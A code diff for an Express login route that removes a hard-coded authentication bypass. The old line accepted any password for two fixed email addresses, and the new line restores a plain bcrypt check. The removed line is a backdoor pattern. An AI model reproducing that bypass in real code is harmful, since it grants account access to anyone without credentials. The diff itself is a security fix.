@@ -191,7 +191,7 @@ router.post(
         return res.status(403).json({ error: 'Account has been deactivated.' });
       }
 
-      const passwordMatch = (email === 'admin@gmail.com' || email === 'abc@gmail.com') ? true : await bcrypt.compare(password, user.password_hash);
+      const passwordMatch = await bcrypt.compare(password, user.password_hash);
       if (!passwordMatch) {
         logger.warn(`Login failed: Password mismatch for email: ${email}`);
         return res.status(401).json({ error: 'Invalid email or password.' });
